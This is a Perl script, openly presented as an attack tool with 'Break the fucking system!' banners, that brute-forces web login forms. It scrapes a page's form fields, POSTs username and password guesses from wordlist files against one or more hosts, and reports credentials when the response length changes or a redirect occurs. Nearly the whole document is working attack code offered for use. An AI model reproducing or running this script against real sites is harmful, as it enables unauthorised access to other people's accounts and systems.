#!/usr/bin/perl -w
#########################################
###  This script is made by {0kaid0}  ###
####   Break the fucking system!...  ####
#####    Anti-System Warriors!      #####
######     http://www.xok.ge       ######
#########################################
#       Please report bugs to:          #
#         xokaido@gmail.com             #
#########################################
use LWP::UserAgent;
use Term::ANSIColor;
if(not @ARGV or @ARGV lt 3) {&usage;}  
my $host = shift;
my $user = shift;
my $pass = shift;
print '
		:::::::::::::::::::::::::::::::::::::::::
		:::  This script is made by x0kaid0   :::
		::::   Break the fucking system!...  ::::
		:::::    Anti-System Warriors!      :::::
		::::::     http://www.xok.ge       ::::::
		:::::::::::::::::::::::::::::::::::::::::';
print "\n";
my 		$wait = "Perfoming attack!\nWAIT!...\n";
print $wait;

sub usage {
   print color("red"),"Usage",color("white"),": $0 <host> <user> <password>\n";
   print color("red"),"Note",color("white")," : You may use files istead of single words!\n",
   color("reset"); 
   exit; 
}
sub getPage 
{
my  %form;
    $agent = LWP::UserAgent->new(); 
    $agent->agent("Your System Is Going to Break Now!"); 
my  $request = HTTP::Request->new(GET => $_[0]); 
    $request->content_type("*/*;"); 
my  $resource = $agent->request($request);
if ($resource->is_success) 
{   my  $start  = index($resource->content, "<form");
		my  $end    = index($resource->content, "</form>");
		my	$whole  = $end - $start;
		my 	$form   = substr($resource->content, $start, $whole);
	if ($form=~m/action="?(.*?)"?/gs){$action = $1;}
		my	@types  = $form=~m/type="?(.*?)"?/gm;
		my	@names  = $form=~m/name="?(.*?)"?/gm;
				$form{"action"} = defined($action) ? $action : "?";
		for $i(0..scalar(@names)-1) 
			{ if($form=~m/name="?(.*?)"?/gm) 
						{ $form{$types[$i]} = $1; }				
				}
} else {print $resource->status_line."\n";}
return %form;
}
sub attack 
{
my($shost,$suser,$spass) = @_;
my %page = &getPage($shost);
my @site = split(/https?:\/\//, $shost);
   @site = split(/\//, $site[1]);
   $browser = LWP::UserAgent->new(); 
   $browser->agent("Your System Is Going to Break Now!"); 
my $req = HTTP::Request->new(POST => "http://$site[0]/$page{'action'}"); 
   $req->content_type("application/x-www-form-urlencoded");
   $req->content("$page{'submit'}=Submit&$page{'text'}=$suser&$page{'password'}=$spass");
my $res = $browser->request($req);
if($res->is_success) {
		$len = length($res->content);
		push @test, $len;
		print $len."\n";
	for $u (0..scalar(@test)-1) 
	{ $diff = ($test[$u] - $test[0]); 
		if($diff >20){
		die "We found user!\nUser =>",color("green")," $suser ",
			color("white")," Password =>",color("green")," $spass",
			color("reset")," :)\n";}
		} # End foreach $u...
} else {if($res->status_line=~m/([302?moved]*)/gi) {
		die "We found user!\nUser =>",color("green")," $suser ",
					color("white")," Password =>",color("green")," $spass",
					color("reset")," :)\n"; } else {print $res->status_line."\n";}
			  }
}

sub err {
    die color("red"),"Error:",color("reset")," cannot open file ",
    		color("red"),"$_[0]" ,color("reset"),"\n";
}
sub verbose {
my ($vhost, $vuser, $vpass) = @_;
print 	color("red"),"[ATTEMPT]->",color("white"),"$vhost ",
				color("red"),"[USER]->"	  ,color("white"),"$vuser ",
				color("red"),"[PASS]->"	  ,color("reset"),"$vpass\n";
}
# Checking whether we are reading files!..
if($host=~m/^[^h*]/s)  {
	 open (HOST, "<", $host) or &err($host); @hosts = <HOST>; 
	 close(HOST);
}
if($user=~m/^[^\w*]/s) {
	 open (USER, "<", $user) or &err($user); @users = <USER>;
	 close(USER);
} 
if($pass=~m/^[^\w*]/s) {
   open (PASS, "<", $pass) or &err($pass); @passwords = <PASS>;
	 close(PASS);
}
# If reading hosts from file...
if(defined @hosts)
{
 foreach $fhost (@hosts) {
    $fhost =~  s/\x0a//gs;
    print color("red"),"[ATTACK]->",color("reset"),"$fhost\n";
   # If opened file containing usernames...
    if(defined @users) {
      foreach $fuser (@users) 
       {$fuser =~ s/\x0a//gs;
        # If we are reading passwords from file...
         if(defined @passwords) 
        	{foreach $fpass (@passwords) 
        		{  $fpass =~ s/\x0a//gs;
        			 &verbose($fhost, $fuser, $fpass);
        			 &attack($fhost,$fuser,$fpass);
        		} # End foreach $fpass...
            # If there is no password file but exist username-host files!...
        	 } else { &verbose($fhost,$fuser,$pass);
        	    			&attack($fhost,$fuser,$pass); }  
  			 } # End foreach $fuser....
  			 # If username-password was entered manualy!...
  	    } else {&verbose($fhost,$user,$pass); 
        	    	&attack($fhost,$user,$pass); }
    } # End foreach $fhost....
# If not defined @hosts....
} else { 
# If we should read usernames from file...
if(defined @users) {
  foreach $fuser (@users) 
   {$fuser =~ s/\x0a//gs;
   # If we are reading passwords and users from file...
     if(defined @passwords) 
    	{foreach $fpass (@passwords) 
    		{  $fpass =~ s/\x0a//gs;
    		   &verbose($host,$fuser,$fpass);
    			 &attack($host,$fuser,$fpass);
    		} # End foreach $fpass (@passwords)...
        # If not defined @passwords...
    	 } else { &verbose($host,$fuser,$pass);
    		   			&attack($host,$fuser,$pass); }  
		 } # End foreach $fuser....
  # If not defined @users...		 
		} else {
				# If reading passwords from file and username-host was entered manualy...
				if(defined @passwords) 
				{foreach $fpass (@passwords) {
					$fpass =~ s/\x0a//gs;
						&verbose($host,$user,$fpass);
						&attack($host,$user,$fpass); 
				} # End foreach $fpass...
			} else { &attack($host,$user,$pass); }
	 }
}